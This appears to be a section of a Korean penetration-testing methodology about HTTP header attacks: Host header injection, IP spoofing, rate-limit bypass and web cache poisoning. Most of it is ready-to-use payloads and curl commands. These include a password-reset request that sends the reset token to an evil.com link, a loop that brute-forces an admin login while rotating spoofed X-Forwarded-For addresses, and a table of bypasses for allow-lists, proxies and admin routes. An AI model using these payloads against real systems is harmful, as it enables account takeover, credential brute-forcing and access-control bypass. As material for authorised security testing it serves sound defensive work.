### Phase 2: 동적 테스트 (검증)

**기본 페이로드:**

**Host 헤더 변조** (`MAIL_HOST_INJECTION` 라벨):
- `Host: evil.com` (응답에 Host 반영 확인)
- `X-Forwarded-Host: evil.com`
- `X-Host: evil.com`
- `X-Original-Host: evil.com`

**패스워드 리셋 메일 host injection (가장 큰 영향):**
```
POST /api/password-reset
Host: evil.com
{"email": "victim@x.com"}
# 메일에 https://evil.com/reset?token=... 링크 → 토큰 탈취
```

**가상 호스트 접근:**
- `Host: internal.target.com` (내부 전용 가상 호스트)
- `Host: localhost`
- `Host: 127.0.0.1`
- `Host: admin.target.local`

**경로 우회 헤더:**
- `X-Original-URL: /admin` (요청 라인은 `/`, 헤더로 admin 접근)
- `X-Rewrite-URL: /admin`
- `X-Override-URL: /admin`

**IP Spoofing** (`IP_SPOOF`/`RATELIMIT_BYPASS` 라벨):

| 헤더 | 페이로드 |
|---|---|
| X-Forwarded-For | `127.0.0.1`, `10.0.0.1`, `192.168.0.1` |
| X-Real-IP | 동일 |
| X-Client-IP | 동일 |
| X-CLUSTER-CLIENT-IP | 동일 |
| True-Client-IP | (Akamai) |
| CF-Connecting-IP | (Cloudflare) |
| X-Originating-IP | (Microsoft) |
| Forwarded | `for=127.0.0.1` (RFC 7239) |

**복합 헤더 변조:**
```
X-Forwarded-For: 127.0.0.1, 192.168.1.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

**Rate limit bypass:**
```bash
# IP 기반 rate limit이면 X-Forwarded-For 변경마다 reset
for i in $(seq 1 100); do
  curl -X POST "https://target/api/login" \
    -H "X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
    -d 'username=admin&password=test'
done
```

**WebSocket 핸드셰이크 Host:**
```
GET /ws HTTP/1.1
Host: evil.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.com
```

**HTTP/2 `:authority`:**
```
curl --http2 "https://target/" -H ":authority: evil.com"
```

**Cache poisoning:**
```bash
# 1차 (공격자) — 변조 Host로 응답 캐시 유발
curl "https://target/?cb=$(date +%s)" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com"
# 2차 (피해자) — 캐시된 변조 응답 수신
curl "https://target/?cb=<같은_value>"
```

---

**우회 페이로드:**

| 방어 | 페이로드 |
|---|---|
| `ALLOWED_HOSTS` substring | `allowed.com.attacker.com`, `allowed.com:80.attacker.com`, `allowed.com\nattacker.com` |
| Host 만 검증 (X-Forwarded-Host 미검증) | `Host: allowed.com` + `X-Forwarded-Host: evil.com` (trust proxy 활성 시) |
| X-Forwarded-For 첫 IP 신뢰 | `X-Forwarded-For: 127.0.0.1, real_client_ip, proxy` (오른쪽 carve 미적용 시) |
| `X-Real-IP` 단일 신뢰 | nginx가 overwrite 안 하면 클라이언트 위조 통과 |
| HTTP/1.1 Host만 검증 | HTTP/2 `:authority` 다른 값 — `curl --http2 -H ":authority: evil.com" ...` |
| Cache key에 Host 미포함 | Web cache poisoning — Host 변조 응답이 다음 요청자에게 캐시 |
| CRLF 차단 안 됨 (Host) | `Host: evil.com\r\nX-Hdr: x` (구버전 서버 한정) |
| ASN/GeoIP geo-blocking | X-Forwarded-For chain에 특정 국가 IP 삽입 |
| `X-Original-URL` 미차단 | gateway는 `/api/x` 접근, X-Original-URL로 admin 우회 |
| Bearer 토큰만 가정 | IP 화이트리스트가 admin route 보호하면 IP_SPOOF 영향 |

---

**참고사항:**

- 패스워드 리셋이 가장 큰 영향 — 피해자 메일에 공격자 도메인 링크 → 토큰 탈취
- API gateway 뒤에서 `trust proxy` 정확한 hop count 미설정 시 X-Forwarded-Host/For 통과
- nginx `proxy_set_header X-Real-IP $remote_addr` 없으면 클라이언트 헤더 그대로 전달
- Cloudflare/AWS ALB는 자체적으로 X-Forwarded-For 추가 — 마지막이 실제 클라이언트, 첫 IP는 위조 가능
- HTTP/2 `:authority` 검증 누락 사례 (Tomcat/Jetty 일부 버전) — 별도 점검
- Web cache poisoning은 응답이 cache header(`Cache-Control: public`) + Host가 cache key 미포함일 때만
- Bearer 토큰 인증 환경에서도 IP 화이트리스트가 admin route 보호하는 경우 IP_SPOOF 영향
- gRPC `:authority` 메타데이터도 같은 문제 (gRPC-Web 게이트웨이 환경)
- WebSocket handshake Host 미검증은 CSWSH 변형 (websocket-scanner 결합)
- `X-Original-URL`/`X-Rewrite-URL`은 일부 미들웨어가 path를 override — gateway 인증 우회
- 메일 발송 시 절대 URL 생성에 Host 헤더 사용하면 거의 확정 — `request.host_url`/`request.build_absolute_uri` 호출 점검
- Sendgrid/Mailgun 같은 외부 메일 서비스로 위임 시에도 본문 내 URL이 변조 host면 동일 영향
- IPv6 X-Forwarded-For (`[::1]`, `[::ffff:127.0.0.1]`)도 시도
- 헤더 순서 변경 (대소문자 변형: `host` vs `Host`)이 일부 파서에 영향
